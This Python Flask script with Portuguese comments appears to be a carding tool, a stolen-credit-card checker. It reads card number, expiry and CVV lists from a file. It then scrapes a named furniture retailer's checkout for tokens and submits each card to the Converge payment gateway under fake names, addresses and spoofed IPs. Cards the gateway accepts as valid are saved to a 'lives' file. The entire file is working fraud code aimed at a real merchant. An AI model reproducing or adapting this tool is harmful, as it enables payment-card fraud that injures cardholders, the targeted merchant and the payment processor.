import requests
import random
import json
import time
import urllib3
from flask import Flask, request
import ipaddress
from bs4 import BeautifulSoup

# Desativar os avisos de solicitação insegura
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Função para extrair texto entre duas substrings
def chave(string, start, end):
    parts = string.split(start)
    if len(parts) > 1:
        subparts = parts[1].split(end)
        if subparts:
            return subparts[0]
    return None

# Função para gerar um endereço de IP aleatório
def generate_random_ip():
    return str(ipaddress.IPv4Address(random.getrandbits(32)))

# Função para randomizar sobrenome
def randomizar_sobrenome():
    sobrenomes = [
        'Silva', 'Santos', 'Pereira', 'Ferreira', 'Oliveira',
        'Ribeiro', 'Rodrigues', 'Almeida', 'Lima', 'Carvalho'
    ]
    return random.choice(sobrenomes)

# Função para randomizar primeiro nome
def randomizar_primeiro_nome():
    nomes = [
        'João', 'Maria', 'Pedro', 'Ana', 'Luís',
        'Sofia', 'Carlos', 'Isabel', 'Miguel', 'Lara'
    ]
    return random.choice(nomes)

# Inicialização do aplicativo Flask
app = Flask(__name__)

# Rota para teste de cartão
@app.route('/')
def teste_cartao():
    # Obtenção do endereço IP do cliente
    user_ip = request.remote_addr
    resultados = []
    aprovadas = []  # Lista para armazenar as aprovações

    with open('ggs.txt', 'r') as file:
        lista = file.readlines()

    with open('reteste.txt', 'r') as file:
        cartoes_testados = file.readlines()

    url_checkout = 'https://www.demeyerfurniture.com/checkout/order-pay/18761/?key=wc_order_UKf3nC6AGkmkf'  # URL da página de checkout

    # Criando uma sessão para lidar com cookies automaticamente
    with requests.Session() as session:
        for cartao in lista:
            cc, mes, ano, cvv = map(str.strip, cartao.split('|'))
            str_lista = '|'.join([cc, mes, ano, cvv])

            # Verifica se o cartão já foi testado anteriormente
            if any(str_lista in line for line in cartoes_testados):
                resultados.append(f'💣 Reprovada » {str_lista} » Este cartão já foi testado anteriormente.')
                continue

            # Gerar números aleatórios
            random_card_number, random_exp_date, random_cvv2 = cc, mes, cvv
            random_ip = generate_random_ip()

            try:
                # Simulando a espera de 12 segundos
                time.sleep(12)

                # Simulando a randomização de nome e sobrenome
                primeiro_nome = randomizar_primeiro_nome()
                sobrenome = randomizar_sobrenome()

                # Fazendo a primeira requisição
                headers = {
                    'Host': 'www.demeyerfurniture.com',
                    'Referer': url_checkout
                }
                payload = {}
                response1 = session.post(url_checkout, headers=headers, data=payload)

                # Extraindo dados da primeira resposta
                order = chave(response1.text, 'order-pay/', '/')
                security2 = chave(response1.text, 'transaction_token_nonce":"', '"')

                # Fazendo a segunda requisição
                headers = {
                    'Host': 'www.demeyerfurniture.com',
                    'Referer': f'https://www.demeyerfurniture.com/checkout/order-pay/{order}/?key=wc_order_UKf3nC6AGkmkf'
                }
                payload = {}
                response2 = session.post(f'https://www.demeyerfurniture.com/wp-admin/admin-ajax.php?action=wc_elavon_vm_get_transaction_token&security={security2}&gateway_id=elavon_converge_credit_card&order_id={order}&tokenize_payment_method=false&test_amount=', headers=headers, data=payload)

                # Extraindo dados da segunda resposta
                token = chave(response2.text, 'transaction_token":"', '"')

                # Fazendo a terceira requisição
                headers = {
                    'Host': 'www.convergepay.com',
                    'Referer': 'https://www.demeyerfurniture.com/'
                }
                payload = {
                    "fields": {
                        "ssl_transaction_type": "ccsale",
                        "ssl_invoice_number": order,
                        "ssl_amount": "741.95",  # Definindo manualmente o valor de ssl_amount
                        "ssl_salestax": "42.00",
                        "ssl_first_name": randomizar_primeiro_nome(),
                        "ssl_last_name": randomizar_sobrenome(),
                        "ssl_company": "gaga",
                        "ssl_avs_address": "agaga",
                        "ssl_address2": "agagag",
                        "ssl_city": "gagaga",
                        "ssl_state": "TX",
                        "ssl_avs_zip": "90001",
                        "ssl_country": "USA",
                        "ssl_email": f"tgag2{random.randint(0, 9999999)}@gmail.com",
                        "ssl_phone": "512521512",
                        "ssl_cardholder_ip": random_ip,
                        "ssl_customer_code": order,
                        "ssl_cvv2cvc2_indicator": 1,
                        "ssl_description": order,
                        "ssl_card_number": cc,
                        "ssl_exp_date": f"{mes}{ano[-2:]}",
                        "ssl_cvv2cvc2": cvv,
                        "ssl_txn_auth_token": token
                    }
                }
                response3 = session.post('https://www.convergepay.com/hosted-payments/service/payment/hpe/process', headers=headers, data=json.dumps(payload), verify=False)

                # Extraindo dados da terceira resposta
                retornocode = chave(response3.text, 'ssl_issuer_response":"', '"')
                retornomsg = chave(response3.text, 'ssl_result_message":"', '"')
                saldo = chave(response3.text, 'ssl_account_balance":"', '"')
                if saldo:
                    saldo = float(saldo) * 5.2
                else:
                    saldo = 0.0

                # Lidando com os diferentes resultados
                if 'PLEASE RETRY5270' in response3.text:
                    resultados.append(f'🎉 @Aprovada » [{cc}|{mes}|{ano}|{cvv}] » [{retornomsg} ({retornocode})] » [Saldo R$: {saldo}] »  @Caterva')
                    aprovadas.append(f'🎉 @Aprovada » [{cc}|{mes}|{ano}|{cvv}] » [{retornomsg} ({retornocode})] » [Saldo R$: {saldo}] »  @Caterva')
                elif 'ssl_issuer_response":"51' in response3.text:
                    resultados.append(f'🎉 @Aprovada » [{cc}|{mes}|{ano}|{cvv}] » [{retornomsg} ({retornocode})] » [Saldo R$: {saldo}] »  @Caterva')
                    aprovadas.append(f'🎉 @Aprovada » [{cc}|{mes}|{ano}|{cvv}] » [{retornomsg} ({retornocode})] » [Saldo R$: {saldo}] »  @Caterva')
                elif 'ssl_issuer_response":"54' in response3.text:
                    resultados.append(f'🎉 @Aprovada » [{cc}|{mes}|{ano}|{cvv}] » [{retornomsg} ({retornocode})] » [Saldo R$: {saldo}] »  @Caterva')
                    aprovadas.append(f'🎉 @Aprovada » [{cc}|{mes}|{ano}|{cvv}] » [{retornomsg} ({retornocode})] » [Saldo R$: {saldo}] »  @Caterva')
                elif 'ssl_card_number' in response3.text:
                    resultados.append(f'💣 @Reprovada » [{cc}|{mes}|{ano}|{cvv}] » [{retornomsg} ({retornocode})] » [Saldo R$: {saldo}]')
                else:
                    resultados.append(f'💣 @Reprovada » [{cc}|{mes}|{ano}|{cvv}] » [{retornomsg} ({retornocode})] » [Saldo R$: {saldo}]')

            except Exception as e:
                resultados.append(f'Desconhecida {str_lista} | {str(e)}')

    # Salvar as aprovações em um arquivo
    with open('lives.txt', 'w') as file:
        for cartao_aprovado in aprovadas:
            file.write(cartao_aprovado + '\n')

    return '<br>'.join(resultados)

# Executar o aplicativo Flask
if __name__ == '__main__':
    app.run(debug=False, threaded=True)
